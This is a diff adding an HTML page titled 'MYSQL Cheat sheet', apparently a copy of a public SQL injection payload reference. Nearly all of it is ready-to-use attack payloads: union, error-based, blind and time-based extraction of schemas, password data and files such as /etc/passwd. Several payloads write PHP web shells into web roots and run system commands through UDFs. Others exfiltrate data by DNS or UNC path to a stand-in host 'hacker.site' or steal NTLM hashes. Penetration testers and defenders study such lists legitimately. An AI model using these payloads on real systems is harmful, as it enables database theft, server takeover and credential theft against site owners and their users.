@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <link crossorigin="anonymous" media="all" integrity="sha512-dsqgdBtnWun6oxDg9q1xezEyITXQ8QsMdFm+JDoDk6Tzx9AEE1XcUEhWff/M2Jv85ucTVJCjp/2fGbh6Omtrgg==" rel="stylesheet" href="https://github.githubassets.com/assets/frameworks-41c2037bf12f1e46d8f08b88a04a8d8f.css" />
+    <link crossorigin="anonymous" media="all" integrity="sha512-7r2i4qESTZjrZJtYNUaBF6Dcj76UPG7nE0UAqVClrGUd7dehuwkBTiAMnQqZ0EFWoYYbSAMs5tLwNue5S1VhaA==" rel="stylesheet" href="https://github.githubassets.com/assets/github-743d1ecdae952365d80e5c6ac503d0af.css" />
+    <meta name="viewport" content="width=device-width">
+    <link href="sql.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Playfair+Display&display=swap" rel="stylesheet">
+    <title>MYSQL Cheat sheet</title>
+
+
+
+
+
+
+
+<div class="mysql">
+<h1>MYSQL Injection</h1>
+<br><br><br>
+
+<h2>MYSQL comment</h2>
+<div class="highlight highlight-source-sql"><pre><span class="pl-c"><span class="pl-c">#</span> MYSQL Comment</span>
+<span class="pl-c"><span class="pl-c">/*</span> MYSQL Comment <span class="pl-c">*/</span></span>
+<span class="pl-c"><span class="pl-c">/*</span>! MYSQL Special SQL <span class="pl-c">*/</span></span>
+<span class="pl-c"><span class="pl-c">/*</span>!32302 10<span class="pl-c">*/</span></span> Comment for MYSQL version <span class="pl-c1">3</span>.<span class="pl-c1">23</span>.<span class="pl-c1">02</span></pre></div>
+<hr>
+
+<h2>MYSQL Union Based</h2>
+<h4>Extract database with information_schema</h4>
+<p>First you need to know the number of columns, you can use <code>order by</code>.</p>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">order by</span> <span class="pl-c1">1</span>
+<span class="pl-k">order by</span> <span class="pl-c1">2</span>
+<span class="pl-k">order by</span> <span class="pl-c1">3</span>
+... ... ... ...
+<span class="pl-k">order by</span> XXX</pre></div>
+<p>Then the following codes will extract the databases'name, tables'name, columns'name.</p>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">UniOn</span> <span class="pl-k">Select</span> <span class="pl-c1">1</span>,<span class="pl-c1">2</span>,<span class="pl-c1">3</span>,<span class="pl-c1">4</span>,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)<span class="pl-k">+</span><span class="pl-k">fRoM</span><span class="pl-k">+</span><span class="pl-c1">information_schema</span>.<span class="pl-c1">schemata</span>
+<span class="pl-k">UniOn</span> <span class="pl-k">Select</span> <span class="pl-c1">1</span>,<span class="pl-c1">2</span>,<span class="pl-c1">3</span>,<span class="pl-c1">4</span>,...,gRoUp_cOncaT(0x7c,table_name,0x7C)<span class="pl-k">+</span><span class="pl-k">fRoM</span><span class="pl-k">+</span><span class="pl-c1">information_schema</span>.<span class="pl-c1">tables</span><span class="pl-k">+</span><span class="pl-k">wHeRe</span><span class="pl-k">+</span>table_schema<span class="pl-k">=</span>...
+<span class="pl-k">UniOn</span> <span class="pl-k">Select</span> <span class="pl-c1">1</span>,<span class="pl-c1">2</span>,<span class="pl-c1">3</span>,<span class="pl-c1">4</span>,...,gRoUp_cOncaT(0x7c,column_name,0x7C)<span class="pl-k">+</span><span class="pl-k">fRoM</span><span class="pl-k">+</span><span class="pl-c1">information_schema</span>.<span class="pl-c1">columns</span><span class="pl-k">+</span><span class="pl-k">wHeRe</span><span class="pl-k">+</span>table_name<span class="pl-k">=</span>...
+<span class="pl-k">UniOn</span> <span class="pl-k">Select</span> <span class="pl-c1">1</span>,<span class="pl-c1">2</span>,<span class="pl-c1">3</span>,<span class="pl-c1">4</span>,...,gRoUp_cOncaT(0x7c,data,0x7C)<span class="pl-k">+</span><span class="pl-k">fRoM</span><span class="pl-k">+</span>...</pre></div>
+<br><hr><br>
+<h3>Extract columns name without information_schema</h3>
+<p>Method for <code>MySQL &gt;= 4.1</code>.</p>
+<p>First extract the column number with</p>
+<div class="highlight highlight-source-sql"><pre>?id<span class="pl-k">=</span>(<span class="pl-c1">1</span>)<span class="pl-k">and</span>(<span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">from</span> <span class="pl-c1">db</span>.<span class="pl-c1">users</span>)<span class="pl-k">=</span>(<span class="pl-c1">1</span>)
+<span class="pl-c"><span class="pl-c">--</span> Operand should contain 4 column(s)</span></pre></div>
+<p>Then extract the column name.</p>
+<div class="highlight highlight-source-sql"><pre>?id<span class="pl-k">=</span><span class="pl-c1">1</span> <span class="pl-k">and</span> (<span class="pl-c1">1</span>,<span class="pl-c1">2</span>,<span class="pl-c1">3</span>,<span class="pl-c1">4</span>) <span class="pl-k">=</span> (<span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">from</span> <span class="pl-c1">db</span>.<span class="pl-c1">users</span> <span class="pl-k">UNION</span> <span class="pl-k">SELECT</span> <span class="pl-c1">1</span>,<span class="pl-c1">2</span>,<span class="pl-c1">3</span>,<span class="pl-c1">4</span> <span class="pl-k">LIMIT</span> <span class="pl-c1">1</span>)
+<span class="pl-c"><span class="pl-c">--</span>Column 'id' cannot be null</span></pre></div>
+<p>Method for <code>MySQL 5</code></p>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">-</span><span class="pl-c1">1</span> <span class="pl-k">UNION</span> <span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> (<span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> users <span class="pl-k">JOIN</span> users b)a
+<span class="pl-c"><span class="pl-c">--</span>#1060 - Duplicate column name 'id'</span>
+
+<span class="pl-k">-</span><span class="pl-c1">1</span> <span class="pl-k">UNION</span> <span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> (<span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> users <span class="pl-k">JOIN</span> users b USING(id))a
+<span class="pl-c"><span class="pl-c">--</span> #1060 - Duplicate column name 'name'</span>
+
+<span class="pl-k">-</span><span class="pl-c1">1</span> <span class="pl-k">UNION</span> <span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> (<span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> users <span class="pl-k">JOIN</span> users b USING(id,name))a
+...</pre></div>
+<br><hr><br>
+<h3>Extract data without columns name</h3>
+<p>Extracting data from the 4th column without knowing its name.</p>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">select</span> <span class="pl-s"><span class="pl-pds">`</span>4<span class="pl-pds">`</span></span> <span class="pl-k">from</span> (<span class="pl-k">select</span> <span class="pl-c1">1</span>,<span class="pl-c1">2</span>,<span class="pl-c1">3</span>,<span class="pl-c1">4</span>,<span class="pl-c1">5</span>,<span class="pl-c1">6</span> <span class="pl-k">union</span> <span class="pl-k">select</span> <span class="pl-k">*</span> <span class="pl-k">from</span> users)dbname;</pre></div>
+<p>Injection example inside the query <code>select author_id,title from posts where author_id=[INJECT_HERE]</code></p>
+<div class="highlight highlight-source-sql"><pre>MariaDB [dummydb]<span class="pl-k">&gt;</span> <span class="pl-k">select</span> author_id,title <span class="pl-k">from</span> posts <span class="pl-k">where</span> author_id<span class="pl-k">=</span><span class="pl-k">-</span><span class="pl-c1">1</span> <span class="pl-k">union</span> <span class="pl-k">select</span> <span class="pl-c1">1</span>,(<span class="pl-k">select</span> concat(<span class="pl-s"><span class="pl-pds">`</span>3<span class="pl-pds">`</span></span>,0x3a,<span class="pl-s"><span class="pl-pds">`</span>4<span class="pl-pds">`</span></span>) <span class="pl-k">from</span> (<span class="pl-k">select</span> <span class="pl-c1">1</span>,<span class="pl-c1">2</span>,<span class="pl-c1">3</span>,<span class="pl-c1">4</span>,<span class="pl-c1">5</span>,<span class="pl-c1">6</span> <span class="pl-k">union</span> <span class="pl-k">select</span> <span class="pl-k">*</span> <span class="pl-k">from</span> users)a <span class="pl-k">limit</span> <span class="pl-c1">1</span>,<span class="pl-c1">1</span>);
+<span class="pl-k">+</span><span class="pl-c"><span class="pl-c">--</span>---------+-----------------------------------------------------------------+</span>
+| author_id | title                                                           |
+<span class="pl-k">+</span><span class="pl-c"><span class="pl-c">--</span>---------+-----------------------------------------------------------------+</span>
+|         <span class="pl-c1">1</span> | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@<span class="pl-c1">example</span>.<span class="pl-c1">org</span> |
+<span class="pl-k">+</span><span class="pl-c"><span class="pl-c">--</span>---------+-----------------------------------------------------------------+</span></pre></div>
+<br><hr><br>
+<h2>MYSQL Error Based</h2>
+<h3>MYSQL Error Based - Basic</h3>
+<p>Works with <code>MySQL &gt;= 4.1</code></p>
+<div class="highlight highlight-source-sql"><pre>(<span class="pl-k">select</span> <span class="pl-c1">1</span> <span class="pl-k">and</span> row(<span class="pl-c1">1</span>,<span class="pl-c1">1</span>)<span class="pl-k">&gt;</span>(<span class="pl-k">select</span> <span class="pl-c1">count</span>(<span class="pl-k">*</span>),concat(CONCAT(@@VERSION),0x3a,floor(rand()<span class="pl-k">*</span><span class="pl-c1">2</span>))x <span class="pl-k">from</span> (<span class="pl-k">select</span> <span class="pl-c1">1</span> <span class="pl-k">union</span> <span class="pl-k">select</span> <span class="pl-c1">2</span>)a <span class="pl-k">group by</span> x <span class="pl-k">limit</span> <span class="pl-c1">1</span>))
+<span class="pl-s"><span class="pl-pds">'</span>+(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+<span class="pl-pds">'</span></span></pre></div>
+<br>
+<h3>MYSQL Error Based - UpdateXML function</h3>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">AND</span> updatexml(rand(),concat(<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>),version(),<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>)),<span class="pl-k">null</span>)<span class="pl-k">-</span>
+<span class="pl-k">AND</span> updatexml(rand(),concat(0x3a,(<span class="pl-k">SELECT</span> concat(<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>),schema_name,<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>)) <span class="pl-k">FROM</span> <span class="pl-c1">information_schema</span>.<span class="pl-c1">schemata</span> <span class="pl-k">LIMIT</span> data_offset,<span class="pl-c1">1</span>)),<span class="pl-k">null</span>)<span class="pl-c"><span class="pl-c">--</span></span>
+<span class="pl-k">AND</span> updatexml(rand(),concat(0x3a,(<span class="pl-k">SELECT</span> concat(<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>),TABLE_NAME,<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>)) <span class="pl-k">FROM</span> <span class="pl-c1">information_schema</span>.<span class="pl-c1">TABLES</span> <span class="pl-k">WHERE</span> table_schema<span class="pl-k">=</span>data_column <span class="pl-k">LIMIT</span> data_offset,<span class="pl-c1">1</span>)),<span class="pl-k">null</span>)<span class="pl-c"><span class="pl-c">--</span></span>
+<span class="pl-k">AND</span> updatexml(rand(),concat(0x3a,(<span class="pl-k">SELECT</span> concat(<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>),column_name,<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>)) <span class="pl-k">FROM</span> <span class="pl-c1">information_schema</span>.<span class="pl-c1">columns</span> <span class="pl-k">WHERE</span> TABLE_NAME<span class="pl-k">=</span>data_table <span class="pl-k">LIMIT</span> data_offset,<span class="pl-c1">1</span>)),<span class="pl-k">null</span>)<span class="pl-c"><span class="pl-c">--</span></span>
+<span class="pl-k">AND</span> updatexml(rand(),concat(0x3a,(<span class="pl-k">SELECT</span> concat(<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>),data_info,<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>)) <span class="pl-k">FROM</span> <span class="pl-c1">data_table</span>.<span class="pl-c1">data_column</span> <span class="pl-k">LIMIT</span> data_offset,<span class="pl-c1">1</span>)),<span class="pl-k">null</span>)<span class="pl-c"><span class="pl-c">--</span></span></pre></div>
+<p>Shorter to read:</p>
+<div class="highlight highlight-source-sql"><pre><span class="pl-s"><span class="pl-pds">'</span> and updatexml(null,concat(0x0a,version()),null)-- -</span>
+<span class="pl-s"><span class="pl-pds">'</span></span> <span class="pl-k">and</span> updatexml(<span class="pl-k">null</span>,concat(0x0a,(<span class="pl-k">select</span> table_name <span class="pl-k">from</span> <span class="pl-c1">information_schema</span>.<span class="pl-c1">tables</span> <span class="pl-k">where</span> table_schema<span class="pl-k">=</span>database() <span class="pl-k">LIMIT</span> <span class="pl-c1">0</span>,<span class="pl-c1">1</span>)),<span class="pl-k">null</span>)<span class="pl-c"><span class="pl-c">--</span> -</span></pre></div>
+<br>
+<h3>MYSQL Error Based - Extractvalue function</h3>
+<p>Works with <code>MySQL &gt;= 5.1</code></p>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">AND</span> extractvalue(rand(),concat(<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>),version(),<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>)))<span class="pl-c"><span class="pl-c">--</span></span>
+<span class="pl-k">AND</span> extractvalue(rand(),concat(0x3a,(<span class="pl-k">SELECT</span> concat(<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>),schema_name,<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>)) <span class="pl-k">FROM</span> <span class="pl-c1">information_schema</span>.<span class="pl-c1">schemata</span> <span class="pl-k">LIMIT</span> data_offset,<span class="pl-c1">1</span>)))<span class="pl-c"><span class="pl-c">--</span></span>
+<span class="pl-k">AND</span> extractvalue(rand(),concat(0x3a,(<span class="pl-k">SELECT</span> concat(<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>),TABLE_NAME,<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>)) <span class="pl-k">FROM</span> <span class="pl-c1">information_schema</span>.<span class="pl-c1">TABLES</span> <span class="pl-k">WHERE</span> table_schema<span class="pl-k">=</span>data_column <span class="pl-k">LIMIT</span> data_offset,<span class="pl-c1">1</span>)))<span class="pl-c"><span class="pl-c">--</span></span>
+<span class="pl-k">AND</span> extractvalue(rand(),concat(0x3a,(<span class="pl-k">SELECT</span> concat(<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>),column_name,<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>)) <span class="pl-k">FROM</span> <span class="pl-c1">information_schema</span>.<span class="pl-c1">columns</span> <span class="pl-k">WHERE</span> TABLE_NAME<span class="pl-k">=</span>data_table <span class="pl-k">LIMIT</span> data_offset,<span class="pl-c1">1</span>)))<span class="pl-c"><span class="pl-c">--</span></span>
+<span class="pl-k">AND</span> extractvalue(rand(),concat(0x3a,(<span class="pl-k">SELECT</span> concat(<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>),data_info,<span class="pl-k">CHAR</span>(<span class="pl-c1">126</span>)) <span class="pl-k">FROM</span> <span class="pl-c1">data_table</span>.<span class="pl-c1">data_column</span> <span class="pl-k">LIMIT</span> data_offset,<span class="pl-c1">1</span>)))<span class="pl-c"><span class="pl-c">--</span></span></pre></div>
+<br><hr><br>
+<h2>MYSQL Blind</h2>
+<h3>MYSQL Blind with substring equivalent</h3>
+<div class="highlight highlight-source-sql"><pre>?id<span class="pl-k">=</span><span class="pl-c1">1</span> <span class="pl-k">and</span> <span class="pl-c1">substring</span>(version(),<span class="pl-c1">1</span>,<span class="pl-c1">1</span>)<span class="pl-k">=</span><span class="pl-c1">5</span>
+?id<span class="pl-k">=</span><span class="pl-c1">1</span> <span class="pl-k">and</span> right(left(version(),<span class="pl-c1">1</span>),<span class="pl-c1">1</span>)<span class="pl-k">=</span><span class="pl-c1">5</span>
+?id<span class="pl-k">=</span><span class="pl-c1">1</span> <span class="pl-k">and</span> left(version(),<span class="pl-c1">1</span>)<span class="pl-k">=</span><span class="pl-c1">4</span>
+?id<span class="pl-k">=</span><span class="pl-c1">1</span> <span class="pl-k">and</span> ascii(<span class="pl-c1">lower</span>(substr(Version(),<span class="pl-c1">1</span>,<span class="pl-c1">1</span>)))<span class="pl-k">=</span><span class="pl-c1">51</span>
+?id<span class="pl-k">=</span><span class="pl-c1">1</span> <span class="pl-k">and</span> (<span class="pl-k">select</span> mid(version(),<span class="pl-c1">1</span>,<span class="pl-c1">1</span>)<span class="pl-k">=</span><span class="pl-c1">4</span>)</pre></div>
+<h3>MYSQL Blind using a conditional statement</h3>
+<p>TRUE: <code>if @@version starts with a 5</code>:</p>
+<div class="highlight highlight-source-sql"><pre><span class="pl-c1">2100935</span><span class="pl-s"><span class="pl-pds">'</span> OR IF(MID(@@version,1,1)=<span class="pl-pds">'</span></span><span class="pl-c1">5</span><span class="pl-s"><span class="pl-pds">'</span>,sleep(1),1)=<span class="pl-pds">'</span></span><span class="pl-c1">2</span>
+Response:
+HTTP<span class="pl-k">/</span><span class="pl-c1">1</span>.<span class="pl-c1">1</span> <span class="pl-c1">500</span> Internal Server Error</pre></div>
+<p>False: <code>if @@version starts with a 4</code>:</p>
+<div class="highlight highlight-source-sql"><pre><span class="pl-c1">2100935</span><span class="pl-s"><span class="pl-pds">'</span> OR IF(MID(@@version,1,1)=<span class="pl-pds">'</span></span><span class="pl-c1">4</span><span class="pl-s"><span class="pl-pds">'</span>,sleep(1),1)=<span class="pl-pds">'</span></span><span class="pl-c1">2</span>
+Response:
+HTTP<span class="pl-k">/</span><span class="pl-c1">1</span>.<span class="pl-c1">1</span> <span class="pl-c1">200</span> OK</pre></div>
+<h3>MYSQL Blind with MAKE_SET</h3>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">AND</span> MAKE_SET(YOLO<span class="pl-k">&lt;</span>(<span class="pl-k">SELECT</span>(length(version()))),<span class="pl-c1">1</span>)
+<span class="pl-k">AND</span> MAKE_SET(YOLO<span class="pl-k">&lt;</span>ascii(<span class="pl-c1">substring</span>(version(),POS,<span class="pl-c1">1</span>)),<span class="pl-c1">1</span>)
+<span class="pl-k">AND</span> MAKE_SET(YOLO<span class="pl-k">&lt;</span>(<span class="pl-k">SELECT</span>(length(concat(login,password)))),<span class="pl-c1">1</span>)
+<span class="pl-k">AND</span> MAKE_SET(YOLO<span class="pl-k">&lt;</span>ascii(<span class="pl-c1">substring</span>(concat(login,password),POS,<span class="pl-c1">1</span>)),<span class="pl-c1">1</span>)</pre></div>
+<h3>MYSQL Blind with LIKE</h3>
+<p><a href="https://www.w3resource.com/sql/wildcards-like-operator/wildcards-underscore.php" rel="nofollow">'_'</a> acts like the regex character '.', use it to speed up your blind testing</p>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">SELECT</span> cust_code <span class="pl-k">FROM</span> customer <span class="pl-k">WHERE</span> cust_name <span class="pl-k">LIKE</span> <span class="pl-s"><span class="pl-pds">'</span>k__l<span class="pl-pds">'</span></span>;</pre></div>
+<br><hr><br>
+<h2>MYSQL Time Based</h2>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">+</span>BENCHMARK(<span class="pl-c1">40000000</span>,SHA1(<span class="pl-c1">1337</span>))<span class="pl-k">+</span>
+<span class="pl-s"><span class="pl-pds">'</span>%2Bbenchmark(3200,SHA1(1))%2B<span class="pl-pds">'</span></span>
+<span class="pl-s"><span class="pl-pds">'</span> OR IF(MID(@@version,1,1)=<span class="pl-pds">'</span></span><span class="pl-c1">5</span><span class="pl-s"><span class="pl-pds">'</span>,sleep(1),1)=<span class="pl-pds">'</span></span><span class="pl-c1">2</span>
+
+<span class="pl-k">AND</span> [RANDNUM]<span class="pl-k">=</span>BENCHMARK([SLEEPTIME]<span class="pl-c1">000000</span>,MD5(<span class="pl-s"><span class="pl-pds">'</span>[RANDSTR]<span class="pl-pds">'</span></span>))  <span class="pl-k">//</span>SHA1
+RLIKE SLEEP([SLEEPTIME])
+<span class="pl-k">OR</span> ELT([RANDNUM]<span class="pl-k">=</span>[RANDNUM],SLEEP([SLEEPTIME]))
+
+?id<span class="pl-k">=</span><span class="pl-c1">1</span> <span class="pl-k">and</span> IF(ASCII(<span class="pl-c1">SUBSTRING</span>((<span class="pl-k">SELECT</span> USER()),<span class="pl-c1">1</span>,<span class="pl-c1">1</span>)))<span class="pl-k">&gt;=</span><span class="pl-c1">100</span>,<span class="pl-c1">1</span>, BENCHMARK(<span class="pl-c1">2000000</span>,MD5(NOW()))) <span class="pl-c"><span class="pl-c">--</span></span>
+?id<span class="pl-k">=</span><span class="pl-c1">1</span> <span class="pl-k">and</span> IF(ASCII(<span class="pl-c1">SUBSTRING</span>((<span class="pl-k">SELECT</span> USER()), <span class="pl-c1">1</span>, <span class="pl-c1">1</span>)))<span class="pl-k">&gt;=</span><span class="pl-c1">100</span>, <span class="pl-c1">1</span>, SLEEP(<span class="pl-c1">3</span>)) <span class="pl-c"><span class="pl-c">--</span></span></pre></div>
+<br><hr><br>
+<h2>MYSQL DIOS - Dump in One Shot</h2>
+<div class="highlight highlight-source-sql"><pre>(<span class="pl-k">select</span> (@) <span class="pl-k">from</span> (<span class="pl-k">select</span>(@:<span class="pl-k">=</span>0x00),(<span class="pl-k">select</span> (@) <span class="pl-k">from</span> (<span class="pl-c1">information_schema</span>.<span class="pl-c1">columns</span>) <span class="pl-k">where</span> (table_schema<span class="pl-k">&gt;=</span>@) <span class="pl-k">and</span> (@)<span class="pl-k">in</span> (@:<span class="pl-k">=</span>concat(@,0x0D,0x0A,<span class="pl-s"><span class="pl-pds">'</span> [ <span class="pl-pds">'</span></span>,table_schema,<span class="pl-s"><span class="pl-pds">'</span> ] &gt; <span class="pl-pds">'</span></span>,table_name,<span class="pl-s"><span class="pl-pds">'</span> &gt; <span class="pl-pds">'</span></span>,column_name,0x7C))))a)<span class="pl-c"><span class="pl-c">#</span></span>
+(<span class="pl-k">select</span> (@) <span class="pl-k">from</span> (<span class="pl-k">select</span>(@:<span class="pl-k">=</span>0x00),(<span class="pl-k">select</span> (@) <span class="pl-k">from</span> (<span class="pl-c1">db_data</span>.<span class="pl-c1">table_data</span>) <span class="pl-k">where</span> (@)<span class="pl-k">in</span> (@:<span class="pl-k">=</span>concat(@,0x0D,0x0A,0x7C,<span class="pl-s"><span class="pl-pds">'</span> [ <span class="pl-pds">'</span></span>,column_data1,<span class="pl-s"><span class="pl-pds">'</span> ] &gt; <span class="pl-pds">'</span></span>,column_data2,<span class="pl-s"><span class="pl-pds">'</span> &gt; <span class="pl-pds">'</span></span>,0x7C))))a)<span class="pl-c"><span class="pl-c">#</span></span></pre></div>
+<br><hr><br>
+
+<h2>MYSQL Current queries</h2>
+<p>This table can list all operations that DB is performing at the moment.</p>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">union</span> <span class="pl-k">SELECT</span> <span class="pl-c1">1</span>,state,info,<span class="pl-c1">4</span> <span class="pl-k">FROM</span> <span class="pl-c1">INFORMATION_SCHEMA</span>.<span class="pl-c1">PROCESSLIST</span> <span class="pl-c"><span class="pl-c">#</span></span>
+
+<span class="pl-c"><span class="pl-c">--</span> Dump in one shot example for the table content.</span>
+<span class="pl-k">union</span> <span class="pl-k">select</span> <span class="pl-c1">1</span>,(<span class="pl-k">select</span>(@)<span class="pl-k">from</span>(<span class="pl-k">select</span>(@:<span class="pl-k">=</span>0x00),(<span class="pl-k">select</span>(@)<span class="pl-k">from</span>(<span class="pl-c1">information_schema</span>.<span class="pl-c1">processlist</span>)<span class="pl-k">where</span>(@)<span class="pl-k">in</span>(@:<span class="pl-k">=</span>concat(@,0x3C62723E,state,0x3a,info))))a),<span class="pl-c1">3</span>,<span class="pl-c1">4</span> <span class="pl-c"><span class="pl-c">#</span></span></pre></div>
+<br><hr><br>
+<h2>MYSQL Read content of a file</h2>
+<p>Need the <code>filepriv</code>, otherwise you will get the error : <code>ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code></p>
+<div class="highlight highlight-source-sql"><pre><span class="pl-s"><span class="pl-pds">'</span> UNION ALL SELECT LOAD_FILE(<span class="pl-pds">'</span></span><span class="pl-k">/</span>etc<span class="pl-k">/</span>passwd<span class="pl-s"><span class="pl-pds">'</span>) --</span></pre></div>
+<p>If you are <code>root</code> on the database, you can re-enable the <code>LOAD_FILE</code> using the following query</p>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">GRANT</span> FILE <span class="pl-k">ON</span> <span class="pl-k">*</span>.<span class="pl-k">*</span> TO <span class="pl-s"><span class="pl-pds">'</span>root<span class="pl-pds">'</span></span>@<span class="pl-s"><span class="pl-pds">'</span>localhost<span class="pl-pds">'</span></span>; FLUSH PRIVILEGES;<span class="pl-c"><span class="pl-c">#</span></span></pre></div>
+<br><hr><br>
+<h2>MYSQL Write a shell</h2>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">SELECT</span> <span class="pl-s"><span class="pl-pds">"</span>&lt;?php system($_GET['cmd']); ?&gt;<span class="pl-pds">"</span></span> into outfile <span class="pl-s"><span class="pl-pds">"</span>C:\\xampp\\htdocs\\backdoor.php<span class="pl-pds">"</span></span>
+<span class="pl-k">SELECT</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span> INTO OUTFILE <span class="pl-s"><span class="pl-pds">'</span>/var/www/html/x.php<span class="pl-pds">'</span></span> FIELDS TERMINATED BY <span class="pl-s"><span class="pl-pds">'</span>&lt;?php phpinfo();?&gt;</span>
+<span class="pl-s">-1 UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPILE <span class="pl-pds">'</span></span>C:<span class="pl-k">/</span>Program Files<span class="pl-k">/</span>EasyPHP<span class="pl-k">-</span><span class="pl-c1">12</span>.<span class="pl-c1">1</span><span class="pl-k">/</span>www<span class="pl-k">/</span><span class="pl-c1">shell</span>.<span class="pl-c1">php</span><span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile <span class="pl-pds">'</span></span>C:\\wamp\\www\\<span class="pl-c1">pwnd</span>.<span class="pl-c1">php</span><span class="pl-s"><span class="pl-pds">'</span>-- -</span>
+<span class="pl-s">[...] union all select 1,2,3,4,"&lt;?php echo shell_exec($_GET[<span class="pl-pds">'</span></span>cmd<span class="pl-s"><span class="pl-pds">'</span>]);?&gt;",6 into OUTFILE <span class="pl-pds">'</span></span>c:<span class="pl-k">/</span>inetpub<span class="pl-k">/</span>wwwroot<span class="pl-k">/</span><span class="pl-c1">backdoor</span>.<span class="pl-c1">php</span><span class="pl-s"><span class="pl-pds">'</span></span></pre></div>
+<br><hr><br>
+<h2>MYSQL Truncation</h2>
+<p>In MYSQL "<code>admin </code>" and "<code>admin</code>" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.</p>
+<br><hr><br>
+<h2>MYSQL UDF command execution</h2>
+<p>First you need to check if the UDF are installed on the server.</p>
+<div class="highlight highlight-source-powershell"><pre>$ whereis lib_mysqludf_sys.so
+<span class="pl-k">/</span>usr<span class="pl-k">/</span>lib<span class="pl-k">/</span>lib_mysqludf_sys.so</pre></div>
+<p>Then you can use functions such as <code>sys_exec</code> and <code>sys_eval</code>.</p>
+<div class="highlight highlight-source-sql"><pre>$ mysql <span class="pl-k">-</span>u root <span class="pl-k">-</span>p mysql
+Enter password: [...]
+mysql<span class="pl-k">&gt;</span> <span class="pl-k">SELECT</span> sys_eval(<span class="pl-s"><span class="pl-pds">'</span>id<span class="pl-pds">'</span></span>);
+<span class="pl-k">+</span><span class="pl-c"><span class="pl-c">--</span>------------------------------------------------+</span>
+| sys_eval(<span class="pl-s"><span class="pl-pds">'</span>id<span class="pl-pds">'</span></span>) |
+<span class="pl-k">+</span><span class="pl-c"><span class="pl-c">--</span>------------------------------------------------+</span>
+| uid<span class="pl-k">=</span><span class="pl-c1">118</span>(mysql) gid<span class="pl-k">=</span><span class="pl-c1">128</span>(mysql) groups<span class="pl-k">=</span><span class="pl-c1">128</span>(mysql) |
+<span class="pl-k">+</span><span class="pl-c"><span class="pl-c">--</span>------------------------------------------------+</span></pre></div>
+<br><hr><br>
+<h2>MYSQL Out of band</h2>
+<div class="highlight highlight-source-powershell"><pre>select @<span class="pl-smi">@version</span> into outfile <span class="pl-s"><span class="pl-pds">'</span>\\\\192.168.0.100\\temp\\out.txt<span class="pl-pds">'</span></span>;
+select @<span class="pl-smi">@version</span> into dumpfile <span class="pl-s"><span class="pl-pds">'</span>\\\\192.168.0.100\\temp\\out.txt</span></pre></div>
+<br><hr><br>
+<h3>DNS exfiltration</h3>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">select</span> load_file(concat(<span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\\\\</span><span class="pl-pds">'</span></span>,version(),<span class="pl-s"><span class="pl-pds">'</span>.hacker.site<span class="pl-cce">\\</span>a.txt<span class="pl-pds">'</span></span>));
+<span class="pl-k">select</span> load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))</pre></div>
+<br><hr><br>
+<h3>UNC Path - NTLM hash stealing</h3>
+<div class="highlight highlight-source-sql"><pre><span class="pl-k">select</span> load_file(<span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\\\\</span>error<span class="pl-cce">\\</span>abc<span class="pl-pds">'</span></span>);
+<span class="pl-k">select</span> load_file(0x5c5c5c5c6572726f725c5c616263);
